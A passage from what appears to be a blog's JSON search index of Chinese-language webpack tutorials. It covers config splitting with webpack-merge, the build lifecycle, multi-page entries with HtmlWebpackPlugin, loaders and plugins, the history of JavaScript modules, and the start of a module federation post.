TerserPlugin()\t&#125;&#125;\n\n拆分配置文件我们使用环境变量将webpack中的生产环境和开发环境的区别都通过三元运算符判断  很糟糕我们将配置文件拆分成两个配置  一个生产环境  一个开发环境只当启动配置文件 npx webpack -c .&#x2F;config&#x2F;webpack.config.dev.js\nnpm脚本每次打包或者启动服务的时候 都需要在命令行里输入一长串的命令\npackage.json文件&#123;\t&quot;scripts&quot;:&#123;\t\t&quot;start&quot;:&quot;npx webpack serve -c ./config/webpack.config.dev.js --env development&quot;,\t\t&quot;build&quot;:&quot;npx wenpack -c ./config/webpack.config.prod.js --env production&quot;\t&#125;&#125;\n\n生产环境进行打包  提示我们在打包的时候超过了打包的预期\nperformance:&#123;   // 性能方面配置\thints:false   //性能提示去掉&#125;\n\n提取公共配置开发环境和生产环境  配置有大量的重复代码   把这些重复代码单独抽到一个配置文件里npm install webpack-merge -D\nwebpack.config.common.js   //通过深merge进行合并三个文件   插件：webpack-mergewebpack.config.js   //这里合并三个文件const &#123;merge&#125; = require(&#x27;webpack-merge&#x27;)const commonConfig = require(&#x27;./webpack.config.common.js&#x27;)const developmentConfig = require(&#x27;./webpack.config.dev.js&#x27;)const productionConfig = require(&#x27;./webpack.config.prod.js&#x27;)module.exports = (env)=&gt;&#123;\tswitch(true)&#123;\t\tcase env.development:\t\t\treturn merge(commonConfig,developmentConfig)\t\tcase env.production:\t\t\treturn merge(commonConfig,productionConfig)\t\tdefault:\t\t\treturn new Error(&#x27;没有找到对应的配置环境&#x27;)\t&#125;&#125;","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpack构建流程","url":"/2020/11/20/webpack/webpack%E6%9E%84%E5%BB%BA%E6%B5%81%E7%A8%8B/","content":"一、运行流程webpack 的运行流程是一个串行的过程，它的工作流程就是将各个插件串联起来\n在运行过程中会广播事件，插件只需要监听它所关心的事件，就能加入到这条webpack机制中，去改变webpack的运作，使得整个系统扩展性良好\n从启动到结束会依次执行以下三大步骤：\n\n初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数\n编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找到该 Module 依赖的 Module，递归地进行编译处理\n输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\n\n\n初始化流程从配置文件和 Shell 语句中读取与合并参数，得出最终的参数\n配置文件默认下为webpack.config.js，也或者通过命令的形式指定配置文件，主要作用是用于激活webpack的加载项和插件\n关于文件配置内容分析，如下注释：\nvar path = require(&#x27;path&#x27;);var node_modules = path.resolve(__dirname, &#x27;node_modules&#x27;);var pathToReact = path.resolve(node_modules, &#x27;react/dist/react.min.js&#x27;);module.exports = &#123;  // 入口文件，是模块构建的起点，同时每一个入口文件对应最后生成的一个 chunk。  entry: &#x27;./path/to/my/entry/file.js&#x27;，  // 文件路径指向(可加快打包过程)。  resolve: &#123;    alias: &#123;      &#x27;react&#x27;: pathToReact    &#125;  &#125;,  // 生成文件，是模块构建的终点，包括输出文件与输出路径。  output: &#123;    path: path.resolve(__dirname, &#x27;build&#x27;),    filename: &#x27;[name].js&#x27;  &#125;,  // 这里配置了处理各模块的 loader ，包括 css 预处理 loader ，es6 编译 loader，图片处理 loader。  module: &#123;    loaders: [      &#123;        test: /\\.js$/,        loader: &#x27;babel&#x27;,        query: &#123;          presets: [&#x27;es2015&#x27;, &#x27;react&#x27;]        &#125;      &#125;    ],    noParse: [pathToReact]  &#125;,  // webpack 各插件对象，在 webpack 的事件流中执行对应的方法。  plugins: [    new webpack.HotModuleReplacementPlugin()  ]&#125;;\n\nwebpack` 将 `webpack.config.js` 中的各个配置项拷贝到 `options` 对象中，并加载用户配置的 `plugins\n\n完成上述步骤之后，则开始初始化Compiler编译对象，该对象掌控者webpack声明周期，不执行具体的任务，只是进行一些调度工作\nclass Compiler extends Tapable &#123;    constructor(context) &#123;        super();        this.hooks = &#123;            beforeCompile: new AsyncSeriesHook([&quot;params&quot;]),            compile: new SyncHook([&quot;params&quot;]),            afterCompile: new AsyncSeriesHook([&quot;compilation&quot;]),            make: new AsyncParallelHook([&quot;compilation&quot;]),            entryOption: new SyncBailHook([&quot;context&quot;, &quot;entry&quot;])            // 定义了很多不同类型的钩子        &#125;;        // ...    &#125;&#125;function webpack(options) &#123;  var compiler = new Compiler();  ...// 检查options,若watch字段为true,则开启watch线程  return compiler;&#125;...\n\nCompiler 对象继承自 Tapable，初始化时定义了很多钩子函数\n编译构建流程根据配置中的 entry 找出所有的入口文件\nmodule.exports = &#123;  entry: &#x27;./src/file.js&#x27;&#125;\n\n初始化完成后会调用Compiler的run来真正启动webpack编译构建流程，主要流程如下：\n\ncompile 开始编译\nmake 从入口点分析模块及其依赖的模块，创建这些模块对象\nbuild-module 构建模块\nseal 封装构建结果\nemit 把各个chunk输出到结果文件\n\ncompile 编译执行了run方法后，首先会触发compile，主要是构建一个Compilation对象\n该对象是编译阶段的主要执行者，主要会依次下述流程：执行模块创建、依赖收集、分块、打包等主要任务的对象\nmake 编译模块当完成了上述的compilation对象后，就开始从Entry入口文件开始读取，主要执行_addModuleChain()函数，如下：\n_addModuleChain(context, dependency, onModule, callback) &#123;   ...   // 根据依赖查找对应的工厂函数   const Dep = /** @type &#123;DepConstructor&#125; */ (dependency.constructor);   const moduleFactory = this.dependencyFactories.get(Dep);      // 调用工厂函数NormalModuleFactory的create来生成一个空的NormalModule对象   moduleFactory.create(&#123;       dependencies: [dependency]       ...   &#125;, (err, module) =&gt; &#123;       ...       const afterBuild = () =&gt; &#123;        this.processModuleDependencies(module, err =&gt; &#123;         if (err) return callback(err);         callback(null, module);           &#125;);    &#125;;              this.buildModule(module, false, null, null, err =&gt; &#123;           ...           afterBuild();       &#125;)   &#125;)&#125;\n\n过程如下：\n_addModuleChain中接收参数dependency传入的入口依赖，使用对应的工厂函数NormalModuleFactory.create方法生成一个空的module对象\n回调中会把此module存入compilation.modules对象和dependencies.module对象中，由于是入口文件，也会存入compilation.entries中\n随后执行buildModule进入真正的构建模块module内容的过程\nbuild module 完成模块编译这里主要调用配置的loaders，将我们的模块转成标准的JS模块\n在用Loader 对一个模块转换完后，使用 acorn 解析转换后的内容，输出对应的抽象语法树（AST），以方便 Webpack后面对代码的分析\n从配置的入口模块开始，分析其 AST，当遇到require等导入其它模块语句时，便将其加入到依赖的模块列表，同时对新找出的依赖模块递归分析，最终搞清所有模块的依赖关系\n输出流程seal 输出资源seal方法主要是要生成chunks，对chunks进行一系列的优化操作，并生成要输出的代码\nwebpack 中的 chunk ，可以理解为配置在 entry 中的模块，或者是动态引入的模块\n根据入口和模块之间的依赖关系，组装成一个个包含多个模块的 Chunk，再把每个 Chunk 转换成一个单独的文件加入到输出列表\nemit 输出完成在确定好输出内容后，根据配置确定输出的路径和文件名\noutput: &#123;    path: path.resolve(__dirname, &#x27;build&#x27;),        filename: &#x27;[name].js&#x27;&#125;\n\n在 Compiler 开始生成文件前，钩子 emit 会被执行，这是我们修改最终文件的最后一个机会\n从而webpack整个打包过程则结束了\n小结\n","categories":["前端工程化"],"tags":["webpack","前端"]},{"title":"webpack多页面应用","url":"/2020/11/09/webpack/webpack%E5%A4%9A%E9%A1%B5%E9%9D%A2%E5%BA%94%E7%94%A8/","content":"entry配置在实际项目的开发中一个完整的系统不会将所有的功能都放在一个网页上，因为这样会导致网页的性能不佳，实际可以按照功能模块划分多个单页应用每个单页应用又生处一个html文件并且随着业务的发展更多的单页应用可以被逐渐的加入到这个项目里。\nentry: [&#x27;./src/file_1.js&#x27;, &#x27;./src/file_2.js&#x27;，&#x27;node_modules里的模块 lodash&#x27;],entry:&#123;\tmain:[&#x27;./src/file_1.js&#x27;, &#x27;./src/file_2.js&#x27;],    //这里使用lodash  还会打包在这里打包一遍\tlodash:&#x27;lodash&#x27;,&#125;entry:&#123;\tmain:&#123;\timport :[&#x27;./src/file_1.js&#x27;, &#x27;./src/file_2.js&#x27;],  //这两个文件可能依赖于lodash，而lodash单独打包了，所以dependOn这个依赖可以把公共的lodash给抽离出来            lodash  就不会在打包一遍了\tdependOn:&#x27;lodash&#x27;,           // 做依赖  这里的lodash  是下面的对应名  可以随意起\t&#125;,    //这里使用lodash  还会打包在这里打包一遍\tlodash:&#x27;lodash&#x27;,&#125;\n对象语法会比较繁琐。然而，这是应用程序中定义入口的最可扩展的方式。描述入口的对象：用于描述入口的对象。你可以使用如下属性：dependOn : 当前入口所依赖的入口。它们必须在该入口被加载前被加载。filename : 指定要输出的文件名称。import : 启动时需加载的模块。library : 指定 library 选项，为当前 entry 构建一个 library。runtime : 运行时 chunk 的名字。如果设置了，就会创建一个新的运行时chunk。在 webpack 5.43.0 之后可将其设为 false 以避免一个新的运行时chunk。publicPath : 当该入口的输出文件在浏览器中被引用时，为它们指定一个公共URL 地址。请查看 output.publicPath。webpack.config.jsruntime 和 dependOn 不应在同一个入口上同时使用，所以如下配置无效，并且会抛出错误：\nmodule.exports = &#123; entry: &#123;  a2: &#x27;dependingfile.js&#x27;,  b2: &#123;   dependOn: &#x27;a2&#x27;,   import: &#x27;./src/app.js&#x27;, &#125;,&#125;,&#125;;\nwebpack.config.js\nmodule.exports = &#123; entry: &#123;  a2: &#x27;./a&#x27;,  b2: &#123;   runtime: &#x27;x2&#x27;,   dependOn: &#x27;a2&#x27;,   import: &#x27;./b&#x27;, &#125;,&#125;,&#125;;\n确保 runtime 不能指向已存在的入口名称，例如下面配置会抛出一个错误：\nmodule.exports = &#123; entry: &#123;  a1: &#x27;./a&#x27;,  b1: &#123;   runtime: &#x27;a1&#x27;,   import: &#x27;./b&#x27;, &#125;,&#125;,&#125;;\n另外 dependOn 不能是循环引用的，下面的例子也会出现错误\nmodule.exports = &#123; entry: &#123;  a3: &#123;   import: &#x27;./a&#x27;,   dependOn: &#x27;b3&#x27;, &#125;,  b3: &#123;   import: &#x27;./b&#x27;,   dependOn: &#x27;a3&#x27;, &#125;,&#125;,&#125;;\n\n配置index.html模板要生成多个HTML文件，请在插件数组中多次声明插件。\n&#123; entry: &#123; \tmain:&#123;\t\timport :[],\t\tdependOn:&#x27;lodash2&#x27;,\t\tfilename:&#x27;chanel1.[name].js&#x27;\t&#125;,\tlodash2:&#123;\t\timport :&#x27;lodash&#x27;,\t\tfilename:&#x27;common/[name].js&#x27;\t&#125; &#125;, plugins: [  new HtmlWebpackPlugin(), // Generates default index.html  new HtmlWebpackPlugin(&#123;  // Also generate a test.html   title:   &#x27;ejs&#x27;,     //在页面可以使用ejs模板语法获取数据   filename: &#x27;chanel1/test.html&#x27;,                      //执行打包后的页面文件     输出的文件名   template: &#x27;src/assets/test.html&#x27;       //指定模板的路径   inject:&#x27;body/head&#x27;,                       // 定义当前所生成的script标签的位置   chunks:[&#x27;自定义那个入口  如：main.js&#x27;]，              //规定当前页面到底打包那些chunk   如何实现多个页面去载入不同的chunk   chunk就是我们在路口配置的项    每一项就是一个chunk  默认会把所有chunk都放进去   publicPash:&#x27;http://www.a.com/&#x27;        //包的前缀 &#125;) ]&#125;&lt;title&gt;&lt;%= htmlWebpackPlugin.options.title  %&gt;&lt;/title&gt;  options.就是我们在HtmlWebpackPlugin定制的选项index.html&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt;  &lt;meta charset=&quot;utf-8&quot;/&gt;  &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;\n\n多页面应用\nmodule.exports = &#123; entry: &#123;  pageOne: &#x27;./src/pageOne/index.js&#x27;,  pageTwo: &#x27;./src/pageTwo/index.js&#x27;,  pageThree: &#x27;./src/pageThree/index.js&#x27;,&#125;,&#125;;\n这是什么？ 我们告诉 webpack 需要三个独立分离的依赖图（如上面的示例）\n为什么？ 在多页面应用程序中，server 会拉取一个新的 HTML 文档给你的客户端。页面重新加载此新文档，并且资源被重新下载。然而，这给了我们特殊的机会去做很多事，例如使用 optimization.splitChunks 为页面间共享的应用程序代码创建bundle。由于入口起点数量的增多，多页应用能够复用多个入口起点之间的大量代码&#x2F;模块，从而可以极大地从这些技术中受益。\n","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpack概念","url":"/2020/11/14/webpack/webpack%E6%A6%82%E5%BF%B5/","content":"一、webpack概述1. 什么是webpack？webpack被定义为现代 JavaScript 应用程序的静态模块打包器(module bundler)，是目前最为流行的JavaScript打包工具之一。\nwebpack会以一个或多个js文件为入口，递归检查每个js模块的依赖，从而构建一个依赖关系图(dependency graph)，然后依据该关系图，将整个应用程序打包成一个或多个bundle。\n由于webpack是用nodejs编写的，所以它依赖的运行环境就是nodejs。也正因为这一点，webpack只能识别JavaScript，所有非JavaScript（包括HTML，CSS，Typescript等）编写的文件都需要经过处理，这是借助对应的loader实现的。\nwebpack使用的是nodejs默认的模块系统：commonjs，借助nodejs提供的API来操作待打包项目的源文件（如fs模块、path模块等）。webpack将这些文件整合压缩后，输出到一个特定的目录下（通常是dist）。处理过的dist一般会被直接上传到静态资源服务器使用。\nwebpack 是一个开源的前端包工具。webpack 提供了前端开发缺乏的模块化开发方式,将各种静态资源视为模块,并从它生成优化过的代码。 要使用 webpack 前须先安装 node.js。\nwebpack是前端的一个自动化工具,有了它可以大大提高写项目的效率,可以对css,js文件进行自动压缩,把sass代码自动解析成对应的css文件,让你的代码和样式实时的显示在浏览器上,当然,我们使用webpack的目的还是为了项目完成后进行打包,webpack并不强制使用AMD或者CMD这之中的某一种方案,而是通过兼容所有模块化方案让你可以按需接入项目，有了webpack，你可以随意选择你喜欢的模块化方案，至于怎么处理模块之间的依赖关系及如何按需打包，webpack会帮你处理好。\n2. 为什么要使用webpack？第一，未打包的项目通常体积庞大，文件数量众多。如果将其直接上传到服务器，用户访问网站时，浏览器会发送大量的http请求来下载这些文件，这会给服务器带来很大的压力，同时客户端的体验也非常不好。\n第二，浏览器本身不支持任何模块系统。因此，使用模块系统开发出的JavaScript代码无法直接在浏览器中运行，而模块系统对现代JavaScript开发是非常重要的。这样，我们需要有一个工具，将模块系统编写出的代码转化为浏览器所能识别的代码。webpack就可以完成这一任务。\n第三，大多数情况下，我们不希望源代码暴露给用户，即使是保密性要求不那么高的前端代码。我们知道，PC端浏览器通常都提供开发者工具，可以方便地查看和调试前端代码，这在开发环境下意义重大。但对于生产环境，暴露源代码不仅没有太大意义，反而存在安全隐患（如果黑客比你更先发现代码中的bug，你可能面临严重损失）。因此，我们可以借助webpack重组和混淆源代码，增加黑客阅读源代码的难度，以提升系统的安全性。\n第四，借助webpack提供的dev-server，可以实现前后端分离。dev-server本质上就是一个node服务。当通过命令行启用dev-server时，webpack会在本地启动一个node服务，将打包后的文件作为静态资源注入该服务，这样就可以在不依赖后台（这种说法并不完全准确，实际上webpack是通过node为你提供后台服务）的情况下进行前端开发了。\n除了以上这些，webpack还有很多强大的功能，这里暂不详述。\n3. 工作原理简单的说就是分析代码，找到“require”、“exports”、“define”等关键词，并替换成对应模块的引用。\n在一个配置文件中，指明对某些文件进行编译、压缩、组合等任务。把你的项目当成一个整体，通过一个给定的主文件 （index.js），webpack将从这个文件开始找到你的项目的所有的依赖文件，使用loaders处理他们，最后打包为一个浏览器可以识别的js文件。\n流程细节Webpack的构建流程可以分为以下三个阶段：\n\n初始化：启动构建，读取与合并配置参数，加载Plugin，实例化Complier.\n编译：从Entry出发，针对每个Module串行调用对应的Loader去翻译文件内容，再找到该Module依赖的Module，递归地进行编译处理。\n输出： 对编译后的Module组合成Chunk，把Chunk转换成文件，输出到文件系统。 如果只执行一次构建，以上阶段将会按照顺序各执行一次。但在开启监听模式下，流程将变为如下： \n\n4. webpack的优缺点？优点：（1） webpack 是以 commonJS 的形式来书写脚本滴，但对 AMD&#x2F;CMD 的支持也很全面，方便旧项目进行代码迁移。（2）能被模块化的不仅仅是 JS 了。（3） 开发便捷，能替代部分 grunt&#x2F;gulp 的工作，比如打包、压缩混淆、图片转base64等。（4）扩展性强，插件机制完善缺点：● 配置复杂● 不分包bundle.js体积庞大● 只能用于采用模块化开发的项目● 打包慢● ES模块除Module外全用babel转换，但是一部分ES2015 语法的 firefox 与 chrome 浏览器中能直接跑的代码，无法用 webpack 编译\n5. 基本配置要在项目中使用webpack，需要首先安装nodejs，它是webpack的运行环境。nodejs安装成功后，就可以通过npm install webpack -g来全局安装webpack。这样就可以在你的项目中使用webpack了。\n在项目中使用webpack的核心是编写配置文件。配置文件通常命名为webpack.config.js，是一个符合commonjs规范的js文件。该文件通过module.exports暴露出一个js对象，我们称这个对象为webpack的配置对象（options）。webpack会根据这个配置对象来决定如何打包项目。\n配置对象中包含四个核心参数：\n入口（entry）Entry:入口指示webpack以哪个文件为入口起点开始打包，分析构建内部依赖图出口（output）output:输出指示webpack的打包后的资源bundles输出到哪里去，以及如何命名加载器（loader）Loader:让webpack能够去处理哪些非JavaScrip文件（webpack自身只理解javaScript)插件（plugin） plugin:插件可以用于执行范围更广的任务。插件的范围包括，从打包优化和压缩，一直到重新定义环境中的变量等插件（mode） mode:模式指示webpack使用相应模式的配置\n1. 入口（entry）顾名思义，它定义了webpack的打包入口，也就是webpack从哪个js开始打包。\n一个应用程序可以有一个或多个入口，由entry属性指定，通常是一个对象。如果这个对象内只包含了一个入口，也可以简写为一个字符串（或字符串数组）。如：\nmodule.exports = &#123;  entry: &#123;    main: &quot;./src/main.js&quot;  &#125;&#125;// 可以简写为:  entry: &quot;./src/main.js&quot;\n上述配置定义src目录下的main.js为打包入口，webpack将从这个文件开始，构建整个项目的依赖关系图。\n一个应用程序可以有多个打包入口，常见的场景如多页应用，独立打包第三方库等：\nentry: &#123;  app: &#x27;./src/app.js&#x27;,  vendors: &#x27;./src/vendors.js&#x27;&#125;\n上面的配置，要求webpack分别以app.js和vendors.js为打包入口，独立构建依赖关系图。最终，项目代码和第三方代码将被独立打包出来。构建多页应用时，也是分别为每个页面提供一个入口文件，独立构建依赖图。\n此外，入口参数允许传入字符串数组。如：\nentry: [&quot;./src/main1.js&quot;, &quot;./src/main2.js&quot;]\n这两个文件都是应用的主入口，它们会被打包生成到同一个chunk文件中。当主入口文件过于庞大，需要拆分成多个，但希望它们输出到同一个打包文件时可以使用。\n2. 出口（output）也就是webpack的输出，由output属性定义。\n与入口不同的是，一个应用程序只能有一个出口。出口是一个对象，包含两个属性：filename和path，分别定义打包结果的文件名和输出位置。如：\nmodule.exports = &#123;  entry: &#123;    main: &quot;./src/main.js&quot;  &#125;,  output: &#123;    filename: &#x27;bundle.js&#x27;,    path: path.resolve(__dirname + &#x27;/dist&#x27;)  &#125;&#125;\n以上配置定义main.js为应用的入口文件，最终输出的文件名为bundle.js，输出位置是当前路径下的dist文件夹。\n当应用程序由多个打包入口时，产生的输出结果也会有很多个，一一为每个文件指定文件名非常不灵活。为此，webpack允许使用占位符来定义文件名。如：\n&#123;  entry: &#123;    app: &#x27;./src/app.js&#x27;,    search: &#x27;./src/search.js&#x27;  &#125;,  output: &#123;    filename: &#x27;[name].js&#x27;,    path: path.resolve(__dirname + &#x27;/dist&#x27;)  &#125;&#125;// 打包将输出app.js和search.js两个文件\n这里filename的值中[name]就是使用了占位符，webpack会将其替换成入口文件的文件名。因此，app.js和search.js这两个入口文件在打包后会在dist文件夹下生成两个同名文件。\n当然，我们几乎从来不会这样定义filename，因为固定的文件名无法用于热更新（HMR，Hot Module Replacement，直译为模块热替换）。热更新的实现机制如下：\n在一份清单文件（manifest文件）中列举所有依赖的模块，每个模块对应的文件名中带有一个版本号，如chunk.1.0.0.js。当某个模块发生修改，就重新打包该模块，并修改对应文件名中的版本号，如chunk.1.0.1.js。此时文件名就发生了变化。热更新机制检测到清单文件中的文件名发生变化，就会重新下载和更新该模块，文件名没有变化的模块不会被重新下载。这样应用就得到了更新。由于webpack不需要对每次的代码修改都进行版本管理，所以它只需要向文件名中插入一个随机的hash值即可。这个hash值每次重新打包都会变化，以保证热更新机制可以正确更新。假如某次打包后的文件名为app.23j3j2366842h76ewhd.js，随后我们对该模块进行了修改，重新打包后webpack插入了一个新的hash值，得到app.er234hh9hydyt586.js。热更新模块检测到文件名变化，就会自动下载这个新的js文件，来更新应用的状态。\n此时的出口一般写成这样：\n&#123;  entry: &#123;    app: &#x27;./src/app.js&#x27;,    search: &#x27;./src/search.js&#x27;  &#125;,  output: &#123;    filename: &#x27;[name].[hash].js&#x27;,    path: path.resolve(__dirname + &#x27;/dist&#x27;)  &#125;&#125;\n这会输出两个类似于app.57bjs8k8rfht7.js和search.su774fju83jur.js的打包结果，它们会被添加到一份清单文件。每当修改模块的内容，webpack都会重新打包，生成新的hash值，并更新清单文件，这样热更新机制就可以生效了。\n注意，使用splitChunk进行代码分割时，被分割出来的代码默认命名为chunk.[hash].js。\n3. 加载器（loader）在介绍加载器之前，我们先来看webpack打包时会遇到的一个问题。\n在概述中我们已经讲到，webpack的运行环境是nodejs，因此它只能识别JavaScript。但是我们的项目中可能存在大量的非JavaScript文件，如HTML、CSS、Typescript、txt，甚至图片文件等。\n有人可能会说，webpack又不需要执行这些文件，直接输出到dist目录下不就行了吗？\n如果这些非JavaScript文件只被js文件引用，而他们之间互相没有依赖关系，webpack确实没必要解析他们。但当它们存在依赖关系时，问题就不这么简单了，如：index.css\n@import &quot;./color.css&quot;\n这里index.css中引入了color.css。我们假设index.css是在js中引入的，那么webpack在解析js时自然会把index.css添加到依赖关系图中。\n可是webpack运行在nodejs环境下，它无法解析index.css的内容，因此它不知道index.css内部还依赖了color.css。这样，color.css就无法被添加到依赖关系图中，而不在依赖关系图中的文件在打包时将被舍弃。也即是说，webpack最终打包出的代码中不会包含color.css。\n这显然是错误的，我们需要color.css。\n为了解决这个问题，我们需要一些额外的代码帮助webpack识别css文件中的依赖。我们会编写一个函数，它将index.css读取为一个字符串，然后转化成js（注意，转化成js只是为了让webpack解析依赖关系，因此转化出的js与原css并不等价）输出出来，这样webpack就可以解析了。而这个用于转换的函数，就称为一个loader。\n所以，一个加载器（loader）实际上就是一个将特定的字符串转化成JavaScript代码的函数。换个角度来说，一个loader就是一个字符串处理函数。\n通常，为了保证loader便于测试和复用，每个loader不会写的很复杂，实现的功能也有限。所以一个文件通常需要多个loader来处理。比如对于一个css文件，我们至少需要两个loader：css-loader和style-loader。前者用于解析css文件，后者用于将css注入到HTML文件中。style-loader会把css添加为页内样式（即直接把样式放在head中的标签内），如果你希望打包出单独的css文件，需要使用extract-loader。\n如果你希望为css文件定义loader，可以这样写（当然你需要使用npm先安装这些loader）：\nmodule.exports = &#123;  module: &#123;    rules: [      &#123;         test: /\\.css$/,         use: [&#x27;style-loader&#x27;, &#x27;css-loader&#x27;]       &#125;,    ]  &#125;&#125;;\n它的含义是，对.css结尾的文件，使用’css-loader’和’style-loader’这两个loader。webpack将依次从后向前执行每个loader。比如在解析到index.css时，它将经历以下步骤：\n使用nodejs的fs模块读取index.css，将读取到的字符串交给css-loader。执行css-loader。它是一个函数，将原始字符串进行一定的处理，输出一个新的字符串。将上一步输出的字符串交给style-loader，进行第二步处理，最终仍然输出一个字符串。由webpack解析最终的处理结果。因为webpack采用的是流式处理，所以loader的书写顺序非常重要，最先需要执行的loader必须放在数组的最后。\n基于这个原理，我们也可以自行手写loader，来满足特定的需求。比如官方没有关于.txt文本文件的loader，所以webpack不能解析文本文件中所包含的依赖（因为文本文件没有任何格式约定，所以无法定义一个普适的loader）。如果你的项目中有需要解析的文本文件，并且它们有严格的格式要求，那么你就可以自行实现一个loader，实现对这类资源的打包。具体实现方法见webpack中文网 - 编写一个 loader。\n4. 插件（plugin）一个插件就是一个对webpack功能的定制或扩展。\nloader的使用场景是有限的，它只能用来帮助webpack加载非js文件。如果我们想在webpack打包的任何一个过程中添加某些特定的功能，就需要借助插件来实现。它是webpack灵活性的一大体现，也是webpack的支柱功能，因为webpack自身就是构建于插件系统之上的。\n比如，我们想要在webpack开始构建时执行某些操作，就可以定义一个像下面的插件：\nconst pluginName = &#x27;ConsoleLogOnBuildWebpackPlugin&#x27;;class ConsoleLogOnBuildWebpackPlugin &#123;    apply(compiler) &#123;        compiler.hooks.run.tap(pluginName, compilation =&gt; &#123;            console.log(&quot;webpack 构建过程开始！&quot;);            console.log(&quot;当前时间：&quot; + new Date());        &#125;);    &#125;&#125;\n在webpack配置文件中这样使用插件：\nconst ConsoleLogOnBuildWebpackPlugin = require(&#x27;ConsoleLogOnBuildWebpackPlugin&#x27;)module.exports = &#123;  ...  plugins: [    new ConsoleLogOnBuildWebpackPlugin()  ]&#125;\n\n这样，webpack在开始构建时，就会执行我们的console.log方法。当然，你可以定制的功能远不止这些，这里只是向你展示插件的基本用法。\n我们看到，一个插件就是一个带有apply原型方法的类（也可以是一个构造函数，并且它的原型对象上有apply方法，两者是等价的）。在配置文件中使用new关键字会创建一个插件实例，webpack将所有插件定义的回调函数注册到对应的生命周期钩子上。当webpack执行到对应的阶段时，就会调用这些钩子函数，实现插件定制的功能。\n插件可以传入一个配置对象，用于构造插件实例。而插件上的原型方法apply会被webpack所调用，webpack会将编译器对象compiler传入apply方法。该对象在整个编译过程中都是可用的。如：\nfunction HelloWorldPlugin(options) &#123;  // 使用 options 设置插件实例&#125;HelloWorldPlugin.prototype.apply = function(compiler) &#123;  compiler.plugin(&#x27;done&#x27;, function(compilation) &#123;    console.log(&#x27;Hello World!&#x27;);  &#125;);&#125;;module.exports = HelloWorldPlugin;\n我们在配置文件中传入的配置对象options会被构造函数接收，用于构造插件实例，在apply方法中可以通过this获得。\n然后我们在插件的原型上定义了一个apply方法，webpack解析配置文件时会执行它，并传入webpack的编译器对象。我们通过语句compiler.plugin(‘done’,function(compilation){…}为webpack的编译器对象注册了一个done阶段（即打包完成）的回调函数。当webpack打包完成时，会调用这个函数，并传入当前webpack的编译器状态对象：compilation。\n我们可以借助compiler和compilation这两个对象，在任何一个阶段执行我们想执行的操作。前者是编译器对象，后者是当前状态对象。具体编写插件的方法请参考webpack中文网 - 编写一个插件。\n","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpack的理解","url":"/2020/11/01/webpack/webpack%E7%9A%84%E7%90%86%E8%A7%A3/","content":"一、背景Webpack 最初的目标是实现前端项目的模块化，旨在更高效地管理和维护项目中的每一个资源\n模块化最早的时候，我们会通过文件划分的形式实现模块化，也就是将每个功能及其相关状态数据各自单独放到不同的JS 文件中\n约定每个文件是一个独立的模块，然后再将这些js文件引入到页面，一个script标签对应一个模块，然后调用模块化的成员\n&lt;script src=&quot;module-a.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;module-b.js&quot;&gt;&lt;/script&gt;\n\n但这种模块弊端十分的明显，模块都是在全局中工作，大量模块成员污染了环境，模块与模块之间并没有依赖关系、维护困难、没有私有空间等问题\n项目一旦变大，上述问题会尤其明显\n随后，就出现了命名空间方式，规定每个模块只暴露一个全局对象，然后模块的内容都挂载到这个对象中\nwindow.moduleA = &#123;  method1: function () &#123;    console.log(&#x27;moduleA#method1&#x27;)  &#125;&#125;\n\n这种方式也并没有解决第一种方式的依赖等问题\n再后来，我们使用立即执行函数为模块提供私有空间，通过参数的形式作为依赖声明，如下\n// module-a.js(function ($) &#123;  var name = &#x27;module-a&#x27;  function method1 () &#123;    console.log(name + &#x27;#method1&#x27;)    $(&#x27;body&#x27;).animate(&#123; margin: &#x27;200px&#x27; &#125;)  &#125;  window.moduleA = &#123;    method1: method1  &#125;&#125;)(jQuery)\n\n上述的方式都是早期解决模块的方式，但是仍然存在一些没有解决的问题。例如，我们是用过script标签在页面引入这些模块的，这些模块的加载并不受代码的控制，时间一久维护起来也十分的麻烦\n理想的解决方式是，在页面中引入一个JS入口文件，其余用到的模块可以通过代码控制，按需加载进来\n除了模块加载的问题以外，还需要规定模块化的规范，如今流行的则是CommonJS、ES Modules\n二、问题从后端渲染的JSP、PHP，到前端原生JavaScript，再到jQuery开发，再到目前的三大框架Vue、React、Angular\n开发方式，也从javascript到后面的es5、es6、7、8、9、10，再到typescript，包括编写CSS的预处理器less、scss等\n现代前端开发已经变得十分的复杂，所以我们开发过程中会遇到如下的问题：\n\n需要通过模块化的方式来开发\n使用一些高级的特性来加快我们的开发效率或者安全性，比如通过ES6+、TypeScript开发脚本逻辑，通过sass、less等方式来编写css样式代码\n监听文件的变化来并且反映到浏览器上，提高开发的效率\nJavaScript 代码需要模块化，HTML 和 CSS 这些资源文件也会面临需要被模块化的问题\n开发完成后我们还需要将代码进行压缩、合并以及其他相关的优化\n\n而webpack恰巧可以解决以上问题\n三、是什么webpack 是一个用于现代JavaScript应用程序的静态模块打包工具\n\n静态模块\n\n这里的静态模块指的是开发阶段，可以被 webpack 直接引用的资源（可以直接被获取打包进bundle.js的资源）\n当 webpack处理应用程序时，它会在内部构建一个依赖图，此依赖图对应映射到项目所需的每个模块（不再局限js文件），并生成一个或多个 bundle\n\nwebpack的能力：编译代码能力，提高效率，解决浏览器兼容问题 模块整合能力，提高性能，可维护性，解决浏览器频繁请求文件的问题 万物皆可模块能力，项目维护性增强，支持不同种类的前端模块类型，统一的模块化方案，所有资源文件的加载都可以通过代码控制 \n","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpack模块联邦","url":"/2020/12/07/webpack/webpack%E6%A8%A1%E5%9D%97%E8%81%94%E9%82%A6/","content":"多个独立的构建可以组成一个应用程序，这些独立的构建之间不应该存在依赖关系，因此可以单独开发和部署它们。这通常被称作微前端，但并不仅限于此。Webpack5 模块联邦可以让 Webpack 达到了线上 Runtime 的效果，让代码直接在项目间利用 CDN 直接共享，不再需要本地安装 Npm 包、构建再发布了！我们知道 Webpack 可以通过 DLL 或者 Externals 做代码共享时 Common 